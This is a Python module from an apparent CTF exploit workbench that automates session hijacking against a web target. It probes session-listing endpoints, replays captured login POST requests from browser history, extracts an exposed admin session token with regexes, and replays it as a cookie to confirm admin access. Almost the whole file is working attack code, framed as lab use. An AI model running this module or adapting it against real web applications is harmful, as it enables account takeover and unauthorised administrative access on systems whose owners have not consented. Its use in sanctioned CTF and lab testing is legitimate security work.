from __future__ import annotations

import re
from urllib.parse import urlparse


from core.module import ExploitModule
from core.models import Artifact, ExploitResult
from core.payloads import get_payloads


class OldSessionsModule(ExploitModule):
    """Use the browser's captured authenticated history to test old sessions.

    The dashboard already records the user's navigation, cookies, request
    headers, and POST bodies.  Reuse that evidence instead of inventing a
    second login flow or hard-coded credentials.  For a CTF target this lets
    the module follow the same sequence the player performed manually:

        register -> login -> authenticated session -> /sessions -> admin token

    The recovered admin session is then replayed against the target and the
    The authenticated response is retained as normal HTTP evidence.
    """

    name = "Old Sessions / Session Hijacking"
    category = "auth/session"

    SESSION_ENDPOINT_CANDIDATES = (
        "/sessions",
        "/session",
        "/api/sessions",
        "/admin/sessions",
        "/debug/sessions",
    )

    @staticmethod
    def _extract_admin_session(text: str) -> str | None:
        if not text:
            return None

        patterns = [
            r"session:([A-Za-z0-9._:-]+)\s*,\s*\{[^}\n]{0,800}['\"]key['\"]\s*:\s*['\"]admin['\"]",
            r"['\"]key['\"]\s*[:=]\s*['\"]admin['\"][^\n]{0,800}?session:([A-Za-z0-9._:-]+)",
        ]
        for pattern in patterns:
            match = re.search(pattern, text, flags=re.IGNORECASE | re.DOTALL)
            if match:
                return match.group(1)

        for line in text.splitlines():
            lowered = line.lower()
            if "admin" not in lowered or "session:" not in lowered:
                continue
            match = re.search(r"session:([A-Za-z0-9._:-]+)", line, flags=re.IGNORECASE)
            if match:
                return match.group(1)
        return None

    @staticmethod
    def _historical_login_requests(requests: list[dict]) -> list[dict]:
        """Return likely historical login requests, newest first.

        We intentionally reuse exact captured POST bodies and headers.  This
        preserves CSRF/hidden fields and the account the player actually used,
        rather than guessing username/password pairs.
        """
        candidates = []
        for item in reversed(requests or []):
            method = str(item.get("method", "")).upper()
            if method != "POST":
                continue
            url = str(item.get("url", ""))
            parsed = urlparse(url)
            path = parsed.path.lower()
            body = item.get("post_data") or item.get("body") or ""
            if not body:
                continue
            if "login" not in path and not any(token in str(body).lower() for token in ("username", "password", "passwd", "user=")):
                continue
            candidates.append(item)
        return candidates

    @staticmethod
    def _safe_replay_headers(request: dict) -> dict[str, str]:
        headers = {}
        for key, value in (request.get("headers") or {}).items():
            low = str(key).lower()
            if low in {"host", "content-length", "cookie"}:
                continue
            headers[str(key)] = str(value)
        return headers

    async def _get_sessions(self, ctx, origin: str, evidence: list[str]):
        """Try common session endpoints without changing the authenticated context."""
        last_response = None
        paths = [p for p in get_payloads(self.name) if isinstance(p, str) and p.startswith("/")]
        if not paths:
            paths = list(self.SESSION_ENDPOINT_CANDIDATES)
        for payload_index, path in enumerate(paths, start=1):
            ctx.logger(f"[payload {payload_index}/{len(paths)}] Old Sessions / Session Hijacking: {path}")
            url = origin + path
            try:
                response = await ctx.http.request("GET", url, follow_redirects=False)
            except Exception as exc:
                evidence.append(f"{path} -> error: {exc}")
                continue
            ctx.inspect_source(str(response.url), response.text, path, payload_index, response.headers.get("content-type", ""))
            evidence.append(f"{path} -> {response.status_code}, {len(response.text)} bytes")
            last_response = response
            # Do not stop on the first accessible endpoint. Every session-path
            # payload must reach a terminal state before this probe pack ends.
        if last_response is not None and last_response.status_code < 300:
            return last_response, "multiple-tested"
        return last_response, None

    async def _reuse_historical_login(self, ctx, origin: str, evidence: list[str]):
        requests = ctx.session.network_requests
        candidates = self._historical_login_requests(requests)
        ctx.artifacts.set(
            "session.historical_login_requests",
            [
                {
                    "method": item.get("method"),
                    "url": item.get("url"),
                    "post_data_present": bool(item.get("post_data")),
                }
                for item in candidates
            ],
        )

        if not candidates:
            evidence.append("No captured POST login request found in Dashboard history")
            return None

        evidence.append(f"Found {len(candidates)} captured login request(s) in Dashboard history")
        for idx, request in enumerate(candidates[:5], start=1):
            login_url = request.get("url", "")
            body = request.get("post_data") or request.get("body") or ""
            headers = self._safe_replay_headers(request)
            evidence.append(f"Replaying captured login request #{idx}: {login_url}")
            try:
                login_response = await ctx.http.request(
                    "POST",
                    login_url,
                    headers=headers,
                    content=body,
                    follow_redirects=False,
                )
            except Exception as exc:
                evidence.append(f"Historical login replay failed: {exc}")
                continue

            set_cookie = bool(login_response.headers.get("set-cookie"))
            evidence.append(
                f"Captured login replay -> {login_response.status_code}; Set-Cookie={set_cookie}"
            )

            # Test the same collection of session endpoints with the resulting
            # cookie jar, without touching or inventing credentials.
            response, path = await self._get_sessions(ctx, origin, evidence)
            if response is not None and response.status_code < 300:
                evidence.append(f"Authenticated session accepted by {path or 'session endpoint'}")
                return response

        return None

    async def run(self, ctx):
        parsed = urlparse(ctx.target.url)
        if not parsed.scheme or not parsed.netloc:
            return ExploitResult(self.name, "no-signal", "Target URL is not usable")

        origin = f"{parsed.scheme}://{parsed.netloc}"
        evidence: list[str] = []

        # 1) Reuse the exact authenticated browser cookie jar first.
        evidence.append(f"Browser cookies available: {len(ctx.session.cookies)}")
        response, path = await self._get_sessions(ctx, origin, evidence)

        # 2) If the current snapshot is not sufficient, reuse an actual login
        # request already captured in Dashboard history.  This is the key
        # behavior requested by the user: the dashboard is the source of truth.
        if response is None or response.status_code in {301, 302, 303, 307, 308}:
            evidence.append("Current browser session did not expose an authenticated session endpoint")
            response = await self._reuse_historical_login(ctx, origin, evidence)

        if response is None:
            return ExploitResult(
                self.name,
                "no-signal",
                "No usable session endpoint response",
                evidence="\n".join(evidence),
            )

        if response.status_code >= 400:
            return ExploitResult(
                self.name,
                "no-signal",
                f"Session endpoint returned HTTP {response.status_code}",
                evidence="\n".join(evidence),
            )

        if response.status_code in {301, 302, 303, 307, 308}:
            return ExploitResult(
                self.name,
                "no-signal",
                "Authenticated Dashboard session was not accepted by the session endpoint",
                evidence="\n".join(evidence),
            )

        admin_token = self._extract_admin_session(response.text)
        if not admin_token:
            # Sometimes the session listing is JSON-ish.  Scan a compact
            # representation as a fallback, but still require an explicit
            # admin marker.
            admin_token = self._extract_admin_session(str(response.json()) if "application/json" in response.headers.get("content-type", "") else "")

        if not admin_token:
            return ExploitResult(
                self.name,
                "no-signal",
                "Session endpoint accessed but no exposed admin session token found",
                artifacts=[Artifact("session.endpoint", path or "unknown", self.name)],
                evidence="\n".join(evidence),
            )

        preview = admin_token[:10] + "..." if len(admin_token) > 10 else admin_token
        evidence.append(f"[+] Exposed admin session token: {preview}")

        try:
            admin_response = await ctx.http.request(
                "GET",
                origin + "/",
                headers={
                    "Cookie": f"session={admin_token}",
                    "User-Agent": "CTF-Exploit-Workbench/3.0.0 (CTF/lab)",
                    "Accept": "*/*",
                },
                follow_redirects=False,
                use_curl=True,
            )
        except Exception as exc:
            return ExploitResult(
                self.name,
                "signal",
                "Admin session recovered, but authenticated request failed",
                artifacts=[Artifact("session.admin_token", admin_token, self.name)],
                evidence="\n".join(evidence + [f"Admin request error: {exc}"]),
            )

        evidence.append(f"Admin session replay -> {admin_response.status_code}, {len(admin_response.text)} bytes")
        artifacts = [
            Artifact("session.admin_token", admin_token, self.name),
            Artifact("session.admin_status", admin_response.status_code, self.name),
            Artifact("session.admin_response_url", str(admin_response.url), self.name),
        ]
        ctx.artifacts.set("session.admin_token", admin_token)
        ctx.artifacts.set("session.admin_status", admin_response.status_code)

        lower = admin_response.text.lower()
        auth_signal = "welcome admin" in lower or "<em>admin</em>" in lower or "username=admin" in lower
        status = "signal" if auth_signal else "no-signal"
        if auth_signal:
            ctx.add_finding(origin + "/", f"session={admin_token}", self.name, f"HTTP {admin_response.status_code}; authenticated admin marker observed", confidence="high")
        message = (
            "Recovered admin session; authenticated response detected"
            if auth_signal
            else "Recovered admin session but no authenticated marker detected"
        )
        return ExploitResult(self.name, status, message, artifacts=artifacts, evidence="\n".join(evidence))
